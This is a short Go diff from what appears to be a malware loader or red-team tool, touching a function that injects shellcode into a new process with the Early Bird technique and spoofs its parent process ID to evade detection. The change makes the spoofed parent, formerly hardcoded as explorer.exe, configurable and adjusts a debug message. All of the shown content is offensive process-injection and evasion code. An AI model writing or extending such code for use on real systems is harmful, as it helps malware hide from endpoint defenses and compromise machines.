@@ -23,7 +23,7 @@ func doEarlyBirdInject(targetExe string, sc []byte) error {
 	var hThread uintptr
 
 	if ppidSpoofEnabled {
-		parentPID := findPidByName("explorer.exe")
+		parentPID := findPidByName(ppidSpoofParent)
 		if parentPID != 0 {
 			hp, ht, _, err := createProcessWithPPIDSpoof(exePath, exePath, parentPID)
 			if err == nil {
@@ -33,7 +33,7 @@ func doEarlyBirdInject(targetExe string, sc []byte) error {
 				fmt.Printf("[!] PPID spoof failed in early bird (%v), falling back\n", err)
 			}
 		} else if Debug {
-			fmt.Println("[!] explorer.exe not found, skipping PPID spoof in early bird")
+			fmt.Printf("[!] %s not found, skipping PPID spoof in early bird\n", ppidSpoofParent)
 		}
 	}
 
